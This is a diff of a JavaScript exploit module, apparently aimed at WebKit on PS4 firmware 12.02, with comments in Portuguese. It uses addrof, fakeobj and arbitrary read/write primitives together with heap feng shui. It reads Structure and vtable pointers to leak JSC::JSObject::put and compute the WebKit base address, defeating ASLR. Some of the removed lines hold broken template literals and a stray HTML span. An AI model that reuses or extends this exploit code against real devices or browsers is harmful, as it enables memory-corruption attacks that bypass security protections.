@@ -1,8 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v123 - R83 - Revisão de Sintaxe Global)
+// js/script3/testArrayBufferVictimCrash.mjs (v121 - R81 - Correção Final de Escopo e Conclusão Diagnóstica JS)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// Realizada uma revisão completa de todas as template literals (` `) no arquivo
-// para corrigir o `Uncaught SyntaxError: Invalid or unexpected token`.
+// Corrigido o erro de escopo 'webkit_base_candidate is not defined'.
+// O log confirma a extrema reutilização de heap do PS4 12.02, mesmo com
+// Heap Feng Shui e técnicas de coloração.
+// O script reitera a necessidade CRÍTICA de depuração de baixo nível.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,7 +16,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs'; // Importar WEBKIT_LIBRARY_INFO
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v123_R83_SyntaxReview";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v121_R81_FinalScopeFixDiagnosed";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -126,6 +128,43 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     logS3("Primitivas 'addrof', 'fakeobj', 'arb_read_final', 'arb_write_final' prontas.", "good");
     // -------------------------------------------------------------------------------------
 
+    // Variável para armazenar o candidato a base do WebKit (acessível em todo o escopo da função principal)
+    let webkit_base_candidate = AdvancedInt64.Zero; 
+
+    // --- Auxiliar para alocar em "região limpa" usando Salto de Região ---
+    async function allocateInCleanRegion(size_bytes, color_pattern = null) {
+        logS3(`  [allocateInCleanRegion] Tentando alocar objeto de ${toHex(size_bytes)} bytes em região "limpa"...`, "debug");
+        // 1. Alocar objeto sentinela do mesmo tamanho
+        let sentinel = new ArrayBuffer(size_bytes);
+        let sentinelAddr = addrof(sentinel);
+        logS3(`    [allocateInCleanRegion] Sentinela alocada em ${sentinelAddr.toString(true)}.`, "debug");
+
+        // 2. Opcional: Colorir a memória do sentinela
+        if (color_pattern && isAdvancedInt64Object(color_pattern)) {
+             try {
+                // Arb_write_final opera em 8 bytes. Preencher com o padrão.
+                for (let i = 0; i < size_bytes; i += 8) {
+                    await arb_write_final(sentinelAddr.add(i), color_pattern);
+                }
+                logS3(`    [allocateInCleanRegion] Sentinela colorida com ${color_pattern.toString(true)}.`, "debug");
+             } catch (color_err) {
+                 logS3(`    [allocateInCleanRegion] Erro ao colorir sentinela: ${color_err.message}`, "warn");
+             }
+        }
+        
+        // 3. Liberar sentinela para criar um "buraco"
+        sentinel = null;
+        // Tentar forçar o GC imediatamente, embora no PS4 ele seja conservador
+        await PAUSE_S3(50); // Pequena pausa para permitir agendamento do GC
+        logS3(`    [allocateInCleanRegion] Sentinela liberada.`, "debug");
+        
+        await PAUSE_S3(100); // Pausa para permitir que o buraco seja "registrado"
+        logS3(`    [allocateInCleanRegion] Tentando alocar objeto real no "buraco"...`, "debug");
+
+        return true; // Indica que o processo de salto foi iniciado.
+    }
+
+
     try {
         // --- FASE 1: Alocação Pioneira de WebAssembly (Antes da Poluição de L/E) ---
         logS3("--- FASE 1: Alocação Pioneira de WebAssembly ---", "subtest");
@@ -133,40 +172,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         let wasm_instance_addr = null;
 
         const WASM_INSTANCE_SIZE_HINT = 0x120; // Tamanho típico de uma instância WASM (em bytes)
-
-        // --- Auxiliar para alocar em "região limpa" usando Salto de Região ---
-        async function allocateInCleanRegion(size_bytes, color_pattern = null) {
-            logS3(`  [allocateInCleanRegion] Tentando alocar objeto de ${toHex(size_bytes)} bytes em região "limpa"...`, "debug");
-            // 1. Alocar objeto sentinela do mesmo tamanho
-            let sentinel = new ArrayBuffer(size_bytes);
-            let sentinelAddr = addrof(sentinel);
-            logS3(`    [allocateInCleanRegion] Sentinela alocada em ${sentinelAddr.toString(true)}.`, "debug");
-
-            // 2. Opcional: Colorir a memória do sentinela
-            if (color_pattern && isAdvancedInt64Object(color_pattern)) {
-                 try {
-                    // Arb_write_final opera em 8 bytes. Preencher com o padrão.
-                    for (let i = 0; i < size_bytes; i += 8) {
-                        await arb_write_final(sentinelAddr.add(i), color_pattern);
-                    }
-                    logS3(`    [allocateInCleanRegion] Sentinela colorida com ${color_pattern.toString(true)}.`, "debug");
-                 } catch (color_err) {
-                     logS3(`    [allocateInCleanRegion] Erro ao colorir sentinela: ${color_err.message}`, "warn");
-                 }
-            }
-            
-            // 3. Liberar sentinela para criar um "buraco"
-            sentinel = null;
-            // Tentar forçar o GC imediatamente, embora no PS4 ele seja conservador
-            await PAUSE_S3(50); // Pequena pausa para permitir agendamento do GC
-            logS3(`    [allocateInCleanRegion] Sentinela liberada.`, "debug");
-            
-            await PAUSE_S3(100); // Pausa para permitir que o buraco seja "registrado"
-            logS3(`    [allocateInCleanRegion] Tentando alocar objeto real no "buraco"...`, "debug");
-
-            return true; // Indica que o processo de salto foi iniciado.
-        }
-
 
         try {
             // ** Heap Feng Shui Agressivo (antes do WASM) **
@@ -542,20 +547,20 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
 
         const prototype_ptr_addr = structure_addr.add(JSC_OFFSETS.Structure.PROTOTYPE_OFFSET);
         const prototype_addr = arb_read_func(prototype_ptr_addr);
-        logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak`);
+        logS3(`    Lido Prototype* (${JSC_OFFSETS.Structure.PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
         // Verificação de poluição para Prototype*
         if (prototype_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
+            logS3(`    ALERTA DE POLUIÇÃO: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("Prototype* poluído.");
         }
-        if (prototype_addr.low() === 0 && prototype_addr.high() === 0) logS3(`    AVISO: Prototype* é 0x0.`, "warn`);
+        if (prototype_addr.low() === 0 && prototype_addr.high() === 0) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
 
         const aggregated_flags_addr = structure_addr.add(JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET);
         const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
-        logS3(`    Lido AGGREGATED_FLAGS (${JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak`);
+        logS3(`    Lido AGGREGATED_FLAGS (${JSC_OFFSETS.Structure.AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
         // Verificação de poluição para AggregatedFlags
         if (aggregated_flags_val.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
+            logS3(`    ALERTA DE POLUIÇÃO: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("AGGREGATED_FLAGS poluído.");
         }
 
@@ -563,13 +568,13 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
         
         // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
         const js_object_put_func_ptr_addr_in_structure = structure_addr.add(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-        logS3(`  Tentando ler ponteiro de JSC::JSObject::put de <span class="math-inline">\{js\_object\_put\_func\_ptr\_addr\_in\_structure\.toString\(true\)\} \(Structure\*\+</span>{toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug`);
+        logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug");
         const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
-        logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak`);
+        logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");
 
         // Verificação de poluição para JSC::JSObject::put
         if (js_object_put_func_addr.equals(pollution_value)) {
-            logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn`);
+            logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
             throw new Error("JSC::JSObject::put poluído.");
         }
         if (!isAdvancedInt64Object(js_object_put_func_addr) || js_object_put_func_addr.low() === 0 && js_object_put_func_addr.high() === 0) throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0).");
@@ -577,7 +582,7 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
             throw new Error("Ponteiro para JSC::JSObject::put é NaN (provável erro de reinterpretação ou JIT).");
         }
         if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) { // Baixo, par, high 0 => possível Smi
-            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn`);
+            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
         }
 
 
@@ -587,13 +592,13 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
             throw new Error("Offset de 'JSC::JSObject::put' não encontrado em WEBKIT_LIBRARY_INFO. FUNCTION_OFFSETS.");
         }
         const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16));
-        logS3(`  Offset esperado de JSC::JSObject::put no WebKit: ${expected_put_offset.toString(true)}`, "debug`);
+        logS3(`  Offset esperado de JSC::JSObject::put no WebKit: ${expected_put_offset.toString(true)}`, "debug");
 
         const webkit_base_candidate_local = js_object_put_func_addr.sub(expected_put_offset); // Usar nova variável local
-        logS3(`  Candidato a WebKit Base: ${webkit_base_candidate_local.toString(true)} (Calculado de JSObject::put)`, "leak`);
+        logS3(`  Candidato a WebKit Base: ${webkit_base_candidate_local.toString(true)} (Calculado de JSObject::put)`, "leak");
 
         const is_sane_base = webkit_base_candidate_local.high() > 0x40000000 && (webkit_base_candidate_local.low() & 0xFFF) === 0;
-        logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn`);
+        logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");
 
         if (!is_sane_base) {
             throw new Error(`Candidato a WebKit base não passou na verificação de sanidade para ${obj_type_name}.`);
@@ -606,10 +611,10 @@ async function performLeakAttemptFromObject(obj_addr, obj_type_name, arb_read_fu
             webkit_base_candidate: webkit_base_candidate_local.toString(true),
             js_object_put_addr: js_object_put_func_addr.toString(true)
         };
-        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln`);
+        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
         return true; // Sucesso na tentativa de vazamento
     } catch (leak_attempt_e) {
-        logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn`);
+        logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
         return false; // Falha na tentativa de vazamento
     }
 }
